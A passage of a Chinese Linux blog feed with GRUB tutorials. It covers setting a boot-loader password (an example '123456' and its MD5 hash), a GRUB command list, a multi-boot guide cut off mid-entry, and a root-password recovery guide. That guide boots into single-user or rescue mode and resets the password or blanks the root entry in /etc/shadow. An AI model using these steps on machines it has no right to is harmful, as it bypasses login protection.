class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">default</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">timeout</span>=<span class="hljs-number">10</span><br><span class="hljs-attribute">splashimage</span>=(hd0,<span class="hljs-number">7</span>)/boot/grub/splash.xpm.gz<br><span class="hljs-attribute">password</span>=<span class="hljs-number">123456</span><br><span class="hljs-attribute">title</span> Fedora Core (<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">22</span>-<span class="hljs-number">1</span>.<span class="hljs-number">2061</span>.nptl)<br><span class="hljs-attribute">lock</span><br><span class="hljs-attribute">root</span> (hd0,<span class="hljs-number">7</span>)<br><span class="hljs-attribute">kernel</span> /boot/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">22</span>-<span class="hljs-number">1</span>.<span class="hljs-number">2061</span>.nptl ro root=LABEL=/<br><span class="hljs-attribute">initrd</span> /boot/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">22</span>-<span class="hljs-number">1</span>.<span class="hljs-number">2061</span>.nptl.img<br><br><span class="hljs-attribute">title</span> WindowsXP<br><span class="hljs-attribute">rootnoverify</span> (hd0,<span class="hljs-number">0</span>)<br><span class="hljs-attribute">chainloader</span> +<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>从上面的可以看出，GRUB的密码是123456，lock的意思就是把Redhat Fedora锁住了。如果启动时会提示错误。这时就应该按P键，然后输入密码就行了。我设置的是123456，当然应该输入123456了，输入别的密码肯定不能通过，这样是不是做到保密了呢？？</p><h2 id="二、GRUB-的md5加密方法；"><a href="#二、GRUB-的md5加密方法；" class="headerlink" title="二、GRUB 的md5加密方法；"></a>二、GRUB 的md5加密方法；</h2><p>经jerboa兄指教，我又读了一下GRUB文档，的确感觉到用md5加密校验GRUB密码比较安全。为了也能让和我一样菜的弟兄，也能知道如何通过md5进行GRUB密码加密，我不得不把这个教程写出来。哈哈，高手就是免读了，此文为菜鸟弟兄所准备。<br>用md5加密校码GRUB密码，这样会更安全。</p><h2 id="1、用grub-md5-crypt成生GRUB的md5密码；"><a href="#1、用grub-md5-crypt成生GRUB的md5密码；" class="headerlink" title="1、用grub-md5-crypt成生GRUB的md5密码；"></a>1、用grub-md5-crypt成生GRUB的md5密码；</h2><p>通过grub-md5-crypt对GRUB的密码进行加密码运算，比如我们想设置grub的密码是123456，所以我们先要用md5进行对123456这个密码进行加密</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@linux01</span> beinan]<span class="hljs-meta"># /sbin/grub-md5-crypt</span><br>Password: 在这里输入<span class="hljs-number">123456</span><br>Retype password: 再输入一次<span class="hljs-number">123456</span><br>$1$7uDL20$eSB.XRPG2A2Fv8AeH34nZ0<br></code></pre></td></tr></table></figure><p>$1$7uDL20$eSB.XRPG2A2Fv8AeH34nZ0 就是通过grub-md5-crypt进行加密码后产生的值。这个值我们要记下来，还是有点用。</p><h2 id="2、更改-x2F-etc-x2F-grub-conf"><a href="#2、更改-x2F-etc-x2F-grub-conf" class="headerlink" title="2、更改 &#x2F;etc&#x2F;grub.conf"></a>2、更改 &#x2F;etc&#x2F;grub.conf</h2><p>比如我原来的&#x2F;etc&#x2F;grub.conf文件的内容是下面的。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">default</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">timeout</span>=<span class="hljs-number">10</span><br><span class="hljs-attribute">splashimage</span>=(hd0,<span class="hljs-number">7</span>)/boot/grub/splash.xpm.gz<br><span class="hljs-attribute">title</span> Fedora Core (<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">22</span>-<span class="hljs-number">1</span>.<span class="hljs-number">2061</span>.nptl)<br><span class="hljs-attribute">root</span> (hd0,<span class="hljs-number">7</span>)<br><span class="hljs-attribute">kernel</span> /boot/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">22</span>-<span class="hljs-number">1</span>.<span class="hljs-number">2061</span>.nptl ro root=LABEL=/<br><span class="hljs-attribute">initrd</span> /boot/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">22</span>-<span class="hljs-number">1</span>.<span class="hljs-number">2061</span>.nptl.img<br><span class="hljs-attribute">title</span> WindowsXP<br><span class="hljs-attribute">rootnoverify</span> (hd0,<span class="hljs-number">0</span>)<br><span class="hljs-attribute">chainloader</span> +<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>所以我要在&#x2F;etc&#x2F;grub.conf中加入 password –md5 $1$7uDL20$eSB.XRPG2A2Fv8AeH34nZ0 这行，以及lock，应该加到哪呢，请看下面的更改实例；</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">timeout</span>=<span class="hljs-number">10</span><br><span class="hljs-attribute">splashimage</span>=(hd0,<span class="hljs-number">7</span>)/boot/grub/splash.xpm.gz<br><span class="hljs-attribute">password</span> --md5 $<span class="hljs-number">1</span>$<span class="hljs-number">7</span>uDL20$eSB.XRPG2A2Fv8AeH34nZ0<br><span class="hljs-attribute">title</span> Fedora Core (<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">22</span>-<span class="hljs-number">1</span>.<span class="hljs-number">2061</span>.nptl)<br><span class="hljs-attribute">lock</span><br><span class="hljs-attribute">root</span> (hd0,<span class="hljs-number">7</span>)<br><span class="hljs-attribute">kernel</span> /boot/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">22</span>-<span class="hljs-number">1</span>.<span class="hljs-number">2061</span>.nptl ro root=LABEL=/<br><span class="hljs-attribute">initrd</span> /boot/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">22</span>-<span class="hljs-number">1</span>.<span class="hljs-number">2061</span>.nptl.img<br><br><span class="hljs-attribute">title</span> WindowsXP<br><span class="hljs-attribute">rootnoverify</span> (hd0,<span class="hljs-number">0</span>)<br><span class="hljs-attribute">chainloader</span> +<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>我们仔细看一下，从上面的我们改过的&#x2F;etc&#x2F;grub.conf中是不是已经用到了我们在第一步通过&#x2F;grub-md5-crypt所产生的密码呢？？是不是有点安全感了？？</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>grub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux root密码丢失解决方法</title>
    <link href="/2018/05/15/2018-05-15-find-lost-root-password/"/>
    <url>/2018/05/15/2018-05-15-find-lost-root-password/</url>
    
    <content type="html"><![CDATA[<p>Linux root密码丢失的解决办法</p><h2 id="和UNIX系统相同，Linux超级用户root拥有系统的最高权限。当由于用户的疏忽，遗忘了root-密码，或者系统受到黑客的入侵，无法用root-账号登录系统时，可以通过下列办法来恢复root-的密码。"><a href="#和UNIX系统相同，Linux超级用户root拥有系统的最高权限。当由于用户的疏忽，遗忘了root-密码，或者系统受到黑客的入侵，无法用root-账号登录系统时，可以通过下列办法来恢复root-的密码。" class="headerlink" title="和UNIX系统相同，Linux超级用户root拥有系统的最高权限。当由于用户的疏忽，遗忘了root 密码，或者系统受到黑客的入侵，无法用root 账号登录系统时，可以通过下列办法来恢复root 的密码。"></a>和UNIX系统相同，Linux超级用户root拥有系统的最高权限。当由于用户的疏忽，遗忘了root 密码，或者系统受到黑客的入侵，无法用root 账号登录系统时，可以通过下列办法来恢复root 的密码。</h2><h2 id="一、进入单用户模式"><a href="#一、进入单用户模式" class="headerlink" title="一、进入单用户模式"></a>一、进入单用户模式</h2><h3 id="1-使用Linux-系统启动软盘"><a href="#1-使用Linux-系统启动软盘" class="headerlink" title="1.使用Linux 系统启动软盘"></a>1.使用Linux 系统启动软盘</h3><p>如果你已创建了Linux 系统的启动软盘，而且设置计算机系统从软盘启动，当显示boot 提示符后输入：</p><pre><code>boot: linux single</code></pre><p>系统进入了提示符为“#”的单用户模式，计算机引导的运行级别为1，本地文件系统被挂载，很多系统服务没有运行，跳过所有系统认证，是一个系统管理员使用特定的机器，把 root 文件系统挂为读写，此时可以使用：</p><p>(1)passwd 程序来设置root的新密码</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># passwd root</span><br><span class="hljs-meta"># reboot</span><br></code></pre></td></tr></table></figure><p>重启系统后，root 密码已被更新。</p><p>(2)通过修改 &#x2F;etc&#x2F;shadow 文件，删除root 的密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /etc</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">vi shadow</span><br></code></pre></td></tr></table></figure><p>将以root 开头的一行中“root：”后和下一个“ ：”前的内容删除，<br>第一行将类似于“root ：：****”，保存后重启系统，root 密码置为空。</p><h2 id="2-以LILO-多系统引导程序启动"><a href="#2-以LILO-多系统引导程序启动" class="headerlink" title="2.以LILO 多系统引导程序启动"></a>2.以LILO 多系统引导程序启动</h2><p>当系统以LILO 引导程序启动时，在出现LILO 提示符时输入：</p><pre><code>LILO: linux single</code></pre><p>进入单用户后，更改password 的方法同1。</p><p>4.3.以GRUB 多系统引导程序启动<br>用GRUB引导系统进入单用户步骤：</p><p>(1) 启动GRUB   ，然后键入 e 来编辑；</p><p>(2) 选择以kernel开头的一行，再按e 键，在此行的末尾，按空格键后输入single，以回车键来退出编辑模式；</p><p>(3) 回到了 GRUB 屏幕后，键入 b 来引导进入单用户模式。</p><p>进入单用户后，更改password 的方法同1。</p><h2 id="二、使用Linux-系统安装盘"><a href="#二、使用Linux-系统安装盘" class="headerlink" title="二、使用Linux 系统安装盘"></a>二、使用Linux 系统安装盘</h2><p>如果你既没做系统启动软盘，同时多系统的引导LILO 和GRUB 又被删除(如重装了Windows 系统后)，那么只能使用Linux 系统安装盘来恢复root 的密码。</p><p>用第一张Linux 系统安装盘启动，出现boot 提示符后输入：</p><pre><code>oot: linux rescue</code></pre><p>此时系统进入救援模式，然后根据提示完成：</p><p>　　1.选择语言和键盘格式；</p><p>　　2.选择是否配置网卡，一般系统因网络不需要，所以可以选择否跳过网卡配置；</p><p>　　3 . 选择是否让系统查找硬盘上的Redhat Linux 系统，选择继续；</p><p>　　4.系统显示硬盘上的系统已经被找到，并挂载在&#x2F;mnt&#x2F;sysimage 下；</p><p>　　5.进入拯救状态，可重新设置root 的密码：</p><pre><code># chroot/mnt/sysimage (让系统成为根环境)# cd /mnt/sysimage# passwd root</code></pre>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>grub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>grub命令</title>
    <link href="/2018/05/15/2018-05-15-grub-command/"/>
    <url>/2018/05/15/2018-05-15-grub-command/</url>
    
    <content type="html"><![CDATA[<h2 id="grub命令"><a href="#grub命令" class="headerlink" title="grub命令"></a>grub命令</h2><h2 id="一、菜单命令"><a href="#一、菜单命令" class="headerlink" title="一、菜单命令"></a>一、菜单命令</h2><p>菜单命令只能用于grub配置文件的全局配置部分，不能用在grub命令行交互界面，菜单命令在配置文件中应放在其它命令之前。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.default</span> <span class="hljs-comment">//设置默认启动的菜单项</span><br><span class="hljs-number">2</span><span class="hljs-selector-class">.fallback</span> <span class="hljs-comment">//设置启动某菜单项失败后反回的菜单项</span><br><span class="hljs-number">3</span><span class="hljs-selector-class">.hiddenmenu</span> <span class="hljs-comment">//隐藏菜单界面</span><br><span class="hljs-number">4</span><span class="hljs-selector-class">.timeout</span> <span class="hljs-comment">//设置菜单自动启动的延时时间</span><br><span class="hljs-number">5</span><span class="hljs-selector-class">.title</span> <span class="hljs-comment">//开始一个菜单项</span><br></code></pre></td></tr></table></figure><h2 id="二、常规命令"><a href="#二、常规命令" class="headerlink" title="二、常规命令"></a>二、常规命令</h2><p>常规命令可以应该于配置文件和grub命令行交互界面，可使用的常规命令有</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.bootp</span> <span class="hljs-comment">//通过bootp初始化网络设备</span><br><span class="hljs-number">2</span><span class="hljs-selector-class">.color</span> <span class="hljs-comment">//设置菜单界面的颜色</span><br><span class="hljs-number">3</span><span class="hljs-selector-class">.device</span> <span class="hljs-comment">//指定设备文件作为驱动器</span><br><span class="hljs-number">4</span><span class="hljs-selector-class">.dhcp</span> <span class="hljs-comment">//通过DHCP初始化网络设备</span><br><span class="hljs-number">5</span><span class="hljs-selector-class">.hide</span> <span class="hljs-comment">//隐藏某分区</span><br><span class="hljs-number">6</span><span class="hljs-selector-class">.ifconfig</span> <span class="hljs-comment">//手工配置网络设备</span><br><span class="hljs-number">7</span><span class="hljs-selector-class">.pager</span> <span class="hljs-comment">//改变内部页程序的状态</span><br><span class="hljs-number">8</span><span class="hljs-selector-class">.partnew</span> <span class="hljs-comment">//新建一个主分区</span><br><span class="hljs-number">9</span><span class="hljs-selector-class">.parttype</span> <span class="hljs-comment">//改变分区的类型</span><br><span class="hljs-number">10</span><span class="hljs-selector-class">.password</span> 为菜单界面设置口令<br><span class="hljs-number">11</span><span class="hljs-selector-class">.rarp</span> <span class="hljs-comment">//通过RARP初始化网络设置</span><br><span class="hljs-number">12</span><span class="hljs-selector-class">.serial</span> <span class="hljs-comment">//设置串口设备</span><br><span class="hljs-number">13</span><span class="hljs-selector-class">.setkey</span> <span class="hljs-comment">//设置键盘映射</span><br><span class="hljs-number">14</span><span class="hljs-selector-class">.splashimage</span> <span class="hljs-comment">//设置GRUB启动时的背景图片文件</span><br><span class="hljs-number">15</span><span class="hljs-selector-class">.termainal</span> <span class="hljs-comment">//选择终端类型</span><br><span class="hljs-number">16</span><span class="hljs-selector-class">.tftpserver</span> <span class="hljs-comment">//指定TFTP服务器</span><br><span class="hljs-number">17</span><span class="hljs-selector-class">.unhide</span> <span class="hljs-comment">//还原某隐藏分区</span><br></code></pre></td></tr></table></figure><h2 id="三、命令行和菜单项命令"><a href="#三、命令行和菜单项命令" class="headerlink" title="三、命令行和菜单项命令"></a>三、命令行和菜单项命令</h2><p>命令行和菜单项命令可应该于GRUB配置文件的菜单项设置中，也可以用在GRUB命令交互界面。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.bolcklist</span> <span class="hljs-comment">//显示某文件所在分区位置（block list notation）</span><br><span class="hljs-number">2</span><span class="hljs-selector-class">.boot</span> <span class="hljs-comment">//启动操作系统</span><br><span class="hljs-number">3</span><span class="hljs-selector-class">.cat</span> <span class="hljs-comment">//显示文件内容</span><br><span class="hljs-number">4</span><span class="hljs-selector-class">.chainloader</span> <span class="hljs-comment">//把启动控制权软交给另外的启动引导器</span><br><span class="hljs-number">5</span><span class="hljs-selector-class">.cmp</span> <span class="hljs-comment">//比较两个文件</span><br><span class="hljs-number">6</span><span class="hljs-selector-class">.configfile</span> <span class="hljs-comment">//加载已存在的GRUB配置文件</span><br><span class="hljs-number">7</span><span class="hljs-selector-class">.debug</span> <span class="hljs-comment">//设置为debug模式</span><br><span class="hljs-number">8</span><span class="hljs-selector-class">.displayapm</span> <span class="hljs-comment">//显示APM BIOS信息</span><br><span class="hljs-number">9</span><span class="hljs-selector-class">.displaymem</span> <span class="hljs-comment">//显示内存配置</span><br><span class="hljs-number">10</span><span class="hljs-selector-class">.embed</span> <span class="hljs-comment">//嵌入Stage 1.5文件</span><br><span class="hljs-number">11</span><span class="hljs-selector-class">.find</span> <span class="hljs-comment">//查找包括某文件的所有设备</span><br><span class="hljs-number">12</span><span class="hljs-selector-class">.fstest</span> <span class="hljs-comment">//测试文件系统</span><br><span class="hljs-number">13</span><span class="hljs-selector-class">.geometry</span> <span class="hljs-comment">//显示某驱动器的物理信息</span><br><span class="hljs-number">14</span><span class="hljs-selector-class">.halt</span> <span class="hljs-comment">//停止计算机运行（软件关机）</span><br><span class="hljs-number">15</span><span class="hljs-selector-class">.help</span> <span class="hljs-comment">//显示GRUB的命令帮助信息</span><br><span class="hljs-number">16</span><span class="hljs-selector-class">.impsprobe</span> <span class="hljs-comment">//查询对称多处理器（SMP）的信息</span><br><span class="hljs-number">17</span><span class="hljs-selector-class">.initrd</span> <span class="hljs-comment">//加载initrd文件</span><br><span class="hljs-number">18</span><span class="hljs-selector-class">.install</span> <span class="hljs-comment">//安装GRUB</span><br><span class="hljs-number">19</span><span class="hljs-selector-class">.ioprobe</span> <span class="hljs-comment">//查询某驱动器的输入输出（I/O）端口</span><br><span class="hljs-number">20</span><span class="hljs-selector-class">.kernel</span> <span class="hljs-comment">//引导操作系统内核</span><br><span class="hljs-number">21</span><span class="hljs-selector-class">.lock</span> <span class="hljs-comment">//锁定某GRUB导菜单项，使其输入密码后才可启动</span><br><span class="hljs-number">22</span><span class="hljs-selector-class">.makeactive</span> <span class="hljs-comment">//激活某主分区</span><br><span class="hljs-number">23</span><span class="hljs-selector-class">.map</span> <span class="hljs-comment">//虚拟映射某驱动器</span><br><span class="hljs-number">24</span><span class="hljs-selector-class">.md5crypt</span> <span class="hljs-comment">//使用MD5加密口令</span><br><span class="hljs-number">25</span><span class="hljs-selector-class">.module</span> <span class="hljs-comment">//加载模块</span><br><span class="hljs-number">26</span><span class="hljs-selector-class">.modulenounzip</span> <span class="hljs-comment">//加载模块不进行解压</span><br><span class="hljs-number">27</span><span class="hljs-selector-class">.pause</span> <span class="hljs-comment">//暂停并等待按键</span><br><span class="hljs-number">28</span><span class="hljs-selector-class">.quit</span> <span class="hljs-comment">//退出GRUB</span><br><span class="hljs-number">29</span><span class="hljs-selector-class">.reboot</span> <span class="hljs-comment">//重新启动计算机</span><br><span class="hljs-number">30</span><span class="hljs-selector-class">.read</span> <span class="hljs-comment">//读取内存中的内容</span><br><span class="hljs-number">31</span><span class="hljs-selector-class">.root</span> <span class="hljs-comment">//设置GRUB的root设备</span><br><span class="hljs-number">32</span><span class="hljs-selector-class">.rootnoverify</span> <span class="hljs-comment">//设备GRUB的root设备但不装载文件系统</span><br><span class="hljs-number">33</span><span class="hljs-selector-class">.savedefault</span> <span class="hljs-comment">//保存当前的启动菜单项为默认启动</span><br><span class="hljs-number">34</span><span class="hljs-selector-class">.setup</span> <span class="hljs-comment">//自动安装GRUB</span><br><span class="hljs-number">35</span><span class="hljs-selector-class">.testload</span> <span class="hljs-comment">//从文件系统中测试读取某文件</span><br><span class="hljs-number">36</span><span class="hljs-selector-class">.testvbe</span> <span class="hljs-comment">//测试VESA BIOS EXTENSION</span><br><span class="hljs-number">37</span><span class="hljs-selector-class">.uppermem</span> <span class="hljs-comment">//强制设置主机上位内存的大小</span><br><span class="hljs-number">38</span><span class="hljs-selector-class">.vbeprobe</span> <span class="hljs-comment">//查询VESA BIOS EXTENSION信息 </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>grub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>grub多系统引导</title>
    <link href="/2018/05/15/2018-05-15-grub-guide-os/"/>
    <url>/2018/05/15/2018-05-15-grub-guide-os/</url>
    
    <content type="html"><![CDATA[<p>grub多系统引导</p><h2 id="摘要：-GRUB是多系统引导管理器，简单的说既能引导Linux，同时也能引导Windows；从讨论区近四年的观察来看，大多初学者并不能在短时间内掌握GRUB的用法，为了解决初学者在最短时间内掌握GRUB，重写GRUB入门文档还是有必要的；本文重点介绍了GRUB的menu-lst的写法，另外通过GRUB命令行引导系统也做了详述；这些无论是对Windows版本的WINGRUB还是Linux版本的GRUB都是适用的；"><a href="#摘要：-GRUB是多系统引导管理器，简单的说既能引导Linux，同时也能引导Windows；从讨论区近四年的观察来看，大多初学者并不能在短时间内掌握GRUB的用法，为了解决初学者在最短时间内掌握GRUB，重写GRUB入门文档还是有必要的；本文重点介绍了GRUB的menu-lst的写法，另外通过GRUB命令行引导系统也做了详述；这些无论是对Windows版本的WINGRUB还是Linux版本的GRUB都是适用的；" class="headerlink" title="摘要： GRUB是多系统引导管理器，简单的说既能引导Linux，同时也能引导Windows；从讨论区近四年的观察来看，大多初学者并不能在短时间内掌握GRUB的用法，为了解决初学者在最短时间内掌握GRUB，重写GRUB入门文档还是有必要的；本文重点介绍了GRUB的menu.lst的写法，另外通过GRUB命令行引导系统也做了详述；这些无论是对Windows版本的WINGRUB还是Linux版本的GRUB都是适用的；"></a>摘要： GRUB是多系统引导管理器，简单的说既能引导Linux，同时也能引导Windows；从讨论区近四年的观察来看，大多初学者并不能在短时间内掌握GRUB的用法，为了解决初学者在最短时间内掌握GRUB，重写GRUB入门文档还是有必要的；<br>本文重点介绍了GRUB的menu.lst的写法，另外通过GRUB命令行引导系统也做了详述；这些无论是对Windows版本的WINGRUB还是Linux版本的GRUB都是适用的；</h2><h1 id="一、什么是多重操作系统引导管理器，什么是GRUB；"><a href="#一、什么是多重操作系统引导管理器，什么是GRUB；" class="headerlink" title="一、什么是多重操作系统引导管理器，什么是GRUB；"></a>一、什么是多重操作系统引导管理器，什么是GRUB；</h1><h2 id="1、什么是多重操作系统引导管理器及工作原理；"><a href="#1、什么是多重操作系统引导管理器及工作原理；" class="headerlink" title="1、什么是多重操作系统引导管理器及工作原理；"></a>1、什么是多重操作系统引导管理器及工作原理；</h2><p>系统启动引导管理器，是在计算机启动后运行的第一个程序，他是用来负责加载、传输控制到操作系统的内核，一旦把内核挂载，系统引导管理器的任务就算完成退出，系统引导的其它部份，比如系统的初始化及启动过程则完全由内核来控制完成；<br /></p><p>Briefly, boot loader is the first software program that runs when a computer starts. It is responsible for loading and transferring control to the operating system kernel software (such as the Hurd or the Linux). The kernel, in turn, initializes the rest of the operating system (e.g. GNU). <br /></p><p>在X86 架构的机器中，Linux、BSD 或其它Unix类的操作系统中GRUB、LILO 是大家最为常用，应该说是主流；</p><p>Windows也有类似的工具NTLOADER；比如我们在机器中安装了Windows 98后，我们再安装一个Windows XP ，在机器启动的会有一个菜单让我们选择进入是进入Windows 98 还是进入Windows XP。NTLOADER就是一个多系统启动引导管理器，NTLOADER 同样也能引导Linux，只是极为麻烦罢了；</p><p>在Powerpc 架构的机器中，如果安装了Linux的Powerpc 版本，大多是用yaboot 多重引导管理器，比如Apple机目前用的是IBM Powerpc处理器，所以在如果想在Apple机上，安装Macos 和Linux Powerpc 版本，大多是用yaboot来引导多个操作系统；</p><p>因为目前X86架构的机器仍是主流， 所以目前GRUB和LILO 仍然是我们最常用的多重操作系统引导管理器；</p><h2 id="2、什么是GRUB；为什么我要选择GRUB；"><a href="#2、什么是GRUB；为什么我要选择GRUB；" class="headerlink" title="2、什么是GRUB；为什么我要选择GRUB；"></a>2、什么是GRUB；为什么我要选择GRUB；</h2><h3 id="1）什么是GRUB；"><a href="#1）什么是GRUB；" class="headerlink" title="1）什么是GRUB；"></a>1）什么是GRUB；</h3><p>GNU GRUB 是一个多重操作系统启动管理器。GNU GRUB 是由GRUB（GRand Unified Bootloader） 派生而来。GRUB 最初由Erich Stefan Boleyn 设计和应用；</p><p>GNU GRUB is a Multiboot boot loader. It was derived from GRUB, GRand Unified Bootloader, which was originally designed and implemented by Erich Stefan Boleyn.</p><h3 id="2）“GRUB太不好用”──对GRUB的认识的误区；"><a href="#2）“GRUB太不好用”──对GRUB的认识的误区；" class="headerlink" title="2）“GRUB太不好用”──对GRUB的认识的误区；"></a>2）“GRUB太不好用”──对GRUB的认识的误区；</h3><p>GRUB真的不好用吗？不是的，通过LinuxSir.Org 社区近四年来的运行，我发现了大多新手弟兄还是不太了解GRUB；当然这也有中文Linux社区的责任，虽然也有GRUB的中文译本，初学Linux的弟兄可能有点看不懂；</p><p>我们欣喜的看到LinuxSir.Org 社区的好多弟兄都曾经或正在写GRUB实践文档，也有的弟兄也总结了GRUB的一些基础知识，比如 probing兄弟的 《GRUB 学习笔记》；由于每个人的写文档时风格不同，可能同一份文档不同的人来写就有不同的风格；所以今天也抖胆也一篇入门级的教程，由于北南不会写高级教程，所以还得请高手弟兄指教，先谢过；</p><h3 id="3）为什么要选择GRUB；"><a href="#3）为什么要选择GRUB；" class="headerlink" title="3）为什么要选择GRUB；"></a>3）为什么要选择GRUB；</h3><p>基于在X86架构的CPU而开发操作系统，系统引导管理器不仅仅有GRUB ，而且也有LILO，但对于多重系统引导管理器，你只能选择其一而用；不能两个同时使用；</p><p>目前这两个多重系统引导管理器是大家最常用的，也是主流Linux发行版而采用的；有的弟兄喜欢GRUB，比如我个人，有的弟兄喜欢LILO ，比如etony兄（谁是etony，请参见 <a href="http://debian.linuxsir.org/">http://debian.linuxsir.org</a> ）；</p><p>主流发行版 Fedora、Redhat、Centos等基于RPM包的系统，在最新版本中都默认GRUB引导；Slackware 目前仍采用LILO；而Debian发行版目前最新的版本也是采用GRUB；</p><p>从目前看来，GRUB有逐渐取代LILO之势，GRUB 2.0正在开发之中；所以我们有理由用GRUB，我也有理由写GRUB使用教程；</p><h1 id="二、GRUB软件包版本选择和安装；"><a href="#二、GRUB软件包版本选择和安装；" class="headerlink" title="二、GRUB软件包版本选择和安装；"></a>二、GRUB软件包版本选择和安装；</h1><h2 id="1、GRUB的版本选择，Linux版本的GRUB及Windows版本的GRUB的说明；"><a href="#1、GRUB的版本选择，Linux版本的GRUB及Windows版本的GRUB的说明；" class="headerlink" title="1、GRUB的版本选择，Linux版本的GRUB及Windows版本的GRUB的说明；"></a>1、GRUB的版本选择，Linux版本的GRUB及Windows版本的GRUB的说明；</h2><p>GRUB不但有Linux版本，也有Windows版本；现我们一一介绍；</p><p>如前面所说，目前在在Unix类的操作系统中，大多是都有GRUB；GRUB几乎能引导所有X86架构的操作系统；功能之强，使用简单是GRUB最大的卖点；由于Windows 操作系统的先入为主的优势，使得大家对Windows的NTLOADER了解的比较多，而对开源社区的GRUB显得有点寞生，由此而带来使用上的“心理恐惧”；究其初学者对GRUB“恐惧”的主要原因还是对GRUB没有太多的了解和深入；无论是WINGRUB还是Linux版本的GRUB，最方便的还是对 GRUB命令行的操作；一谈到命令行（Command）的操作，可能初学者对此恐惧；其实没有什么难的，象北南这样低级的写手，还能操作得起来，您也应该能行；</p><h2 id="2、GRUB的Windows版本WINGRUB；"><a href="#2、GRUB的Windows版本WINGRUB；" class="headerlink" title="2、GRUB的Windows版本WINGRUB；"></a>2、GRUB的Windows版本WINGRUB；</h2><p>请参考：《以WINGRUB 引导安装Fedora 4.0 为例，详述用WINGRUB来引导Linux的安装》</p><h2 id="3、GRUB的Linux版本软件包的安装；"><a href="#3、GRUB的Linux版本软件包的安装；" class="headerlink" 